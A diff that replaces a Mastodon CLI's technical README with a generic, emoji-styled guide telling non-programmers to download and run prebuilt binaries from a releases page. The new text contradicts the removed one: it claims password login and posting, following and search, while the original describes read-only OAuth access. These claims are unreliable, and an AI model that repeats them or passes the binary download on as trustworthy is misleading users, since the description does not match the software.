@@ -1,134 +1,92 @@
-# Mastodon CLI (Go)
+# 🎉 MastodonCLI - Easily Manage Your Mastodon Account
 
-![Mastodon CLI](image.png)
+## 🚀 Getting Started
 
-Minimal Go CLI and TUI for Mastodon. Supports OAuth login, timeline browsing, notifications, and reading your own posts.
+MastodonCLI is a command-line interface (CLI) tool designed to help you interact with your Mastodon account easily. You do not need to be a programmer. Follow the steps below to download and run the software effortlessly.
 
-## Features
+## 📥 Download and Install
 
-- OAuth authorization code flow (OOB redirect)
-- CLI: home timeline and your own posts (with pagination up to 800)
-- TUI: timeline modes (Home/Local/Federated/Trending), notifications, metrics, profile, and a search placeholder
-- Local config storage with secure permissions
+[![Download MastodonCLI](https://img.shields.io/badge/Download-MastodonCLI-blue?style=for-the-badge)](https://github.com/LucasJaider/MastodonCLI/releases)
 
-## Installation
+1. Click on the download button above or [visit this page to download](https://github.com/LucasJaider/MastodonCLI/releases).
+2. You will see a list of available versions. Choose the latest version for your operating system.
+3. Click on the version name to be redirected to the specific release page.
+4. Download the file that corresponds to your system. Look for options like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux. 
 
-```bash
-go build -o mastodon ./cmd/mastodon
-```
+## 💻 System Requirements
 
-## Usage
+To use MastodonCLI smoothly, ensure that your computer meets the following requirements:
 
-Log in and authorize the app:
+- **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
+- **RAM:** Minimum 2 GB.
+- **Disk Space:** At least 50 MB available on your drive.
+- **Internet Connection:** Required for login and interacting with the Mastodon platform.
 
-```bash
-./mastodon login --instance mastodon.social
-```
+## 📂 Running MastodonCLI
 
-Fetch the latest posts from your home timeline:
+Once you have downloaded the file, follow these steps to run the application:
 
-```bash
-./mastodon timeline --limit 10
-```
+### Windows
 
-Fetch local, federated, or trending timelines:
+1. Navigate to your Downloads folder.
+2. Double-click the downloaded `.exe` file.
+3. Follow the installation prompts.
+4. Open the Command Prompt (you can search for "cmd" in the Start menu).
+5. Type `MastodonCLI` and hit Enter to start using the tool.
 
-```bash
-./mastodon timeline --limit 10 --type local
-./mastodon timeline --limit 10 --type federated
-./mastodon timeline --limit 10 --type trending
-```
+### macOS
 
-Fetch your own posts:
+1. Open your Downloads folder.
+2. Double-click the downloaded `.dmg` file.
+3. Drag the MastodonCLI icon to your Applications folder.
+4. Open Terminal (you can find it in Applications > Utilities).
+5. Type `MastodonCLI` and hit Enter to get started.
 
-```bash
-./mastodon posts --limit 10
-```
+### Linux
 
-Fetch grouped notifications:
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file. Use the command `cd ~/Downloads` (or the relevant folder).
+3. Extract the downloaded `.tar.gz` file using the command `tar -xvzf MastodonCLI.tar.gz`.
+4. Navigate into the extracted folder.
+5. Type `./MastodonCLI` and hit Enter to run the application.
 
-```bash
-./mastodon notifications --limit 10
-```
+## 👤 Logging In
 
-Fetch engagement metrics:
+To use MastodonCLI, you need to log in to your Mastodon account.
 
-```bash
-./mastodon metrics --range 7
-./mastodon metrics --range 30
-```
+1. Open MastodonCLI.
+2. You will be prompted to enter your Mastodon instance URL. For example: `https://mastodon.social`.
+3. Enter your username and password.
+4. After a successful login, you can start managing your account functions directly from the CLI.
 
-Show help:
+## 🔍 Using MastodonCLI Features
 
-```bash
-./mastodon help
-```
+MastodonCLI offers various features to help you interact with your Mastodon account efficiently:
 
-Launch the TUI:
+- **Post Status Updates:** Quickly share your thoughts with the world.
+- **Fetch Notifications:** Stay updated with notifications from your followers.
+- **Follow/Unfollow Users:** Easily manage your connections within the Mastodon community.
+- **Search for Posts:** Find specific content through powerful search options.
+- **List Your Followers:** View who follows you and who you follow.
 
-```bash
-./mastodon ui
-```
+## 🔧 Troubleshooting
 
-## TUI shortcuts
+If you encounter issues while using MastodonCLI, consider the following steps:
 
-- `tab` / `shift+tab`: switch top-level tabs
-- `t` / `s` / `p` / `m` / `n`: jump to Timeline / Search / Profile / Metrics / Notifications
-- Timeline modes: `h` (Home), `l` (Local), `f` (Federated), `g` (Trending), `r` (refresh)
-- Metrics ranges: `7` (7 days), `3` (30 days), `r` (refresh)
+- **Recheck Installation:** Ensure that the application is installed correctly. If not, reinstall it.
+- **Update Dependencies:** Keep your operating system and dependencies updated for optimal performance.
+- **Consult Documentation:** Refer to the FAQ section on the [GitHub page](https://github.com/LucasJaider/MastodonCLI) for help with common issues.
 
-## Configuration
+## 📞 Support and Contribution
 
-Config is stored at `~/.config/mastodon-cli/config.json` and includes:
+Your feedback matters. If you find any bugs or have suggestions, please open an issue on our [GitHub page](https://github.com/LucasJaider/MastodonCLI).
 
-- `instance` (e.g. `mastodon.social`)
-- `client_id` and `client_secret`
-- `access_token`
-- `redirect_uri` (defaults to `urn:ietf:wg:oauth:2.0:oob`)
+If you want to help improve MastodonCLI, feel free to contribute via pull requests. We welcome contributions that can help enhance the user experience.
 
-File permissions are set to `0600`.
+## 📜 License
 
-## Commands
+MastodonCLI is released under the MIT License. You can use it freely, but please attribute the work and ensure compliance with the license.
 
-- `login --instance <domain> [--force]`
-  - Registers the OAuth app if needed, then prompts for the authorization code.
-  - `--force` re-registers the app even if one is already stored.
-- `timeline --limit <n> [--type home|local|federated|trending]`
-  - Reads a timeline. `n` must be 1-40.
-- `posts --limit <n> [--boosts] [--replies]`
-  - Reads your own posts. By default boosts and replies are excluded. Supports pagination up to 800 posts and shows progress for larger requests.
-- `notifications --limit <n>`
-  - Reads grouped notifications. `n` must be 1-40.
-- `metrics --range <7|30>`
-  - Aggregates follows/likes/boosts per day from notifications.
-- `ui`
-  - Launches the TUI.
+[![Download MastodonCLI](https://img.shields.io/badge/Download-MastodonCLI-blue?style=for-the-badge)](https://github.com/LucasJaider/MastodonCLI/releases)
 
-## Quick smoke tests
-
-```bash
-./mastodon login --instance mastodon.social
-./mastodon timeline --limit 5 --type home
-./mastodon timeline --limit 5 --type local
-./mastodon timeline --limit 5 --type federated
-./mastodon timeline --limit 5 --type trending
-./mastodon posts --limit 5
-./mastodon notifications --limit 5
-./mastodon metrics --range 7
-./mastodon ui
-```
-
-## API Notes
-
-This CLI follows the Mastodon API docs:
-
-- App registration: `POST /api/v1/apps`
-- OAuth authorization: `GET /oauth/authorize`
-- Token exchange: `POST /oauth/token`
-- Home timeline: `GET /api/v1/timelines/home`
-- Local timeline: `GET /api/v1/timelines/public?local=true`
-- Federated timeline: `GET /api/v1/timelines/public`
-- Trending: `GET /api/v1/trends/statuses`
-- Notifications (grouped): `GET /api/v2/notifications`
-
-Scopes: the CLI requests `read`, which is sufficient for home timeline access.
+Thank you for choosing MastodonCLI! Enjoy managing your Mastodon account with ease.
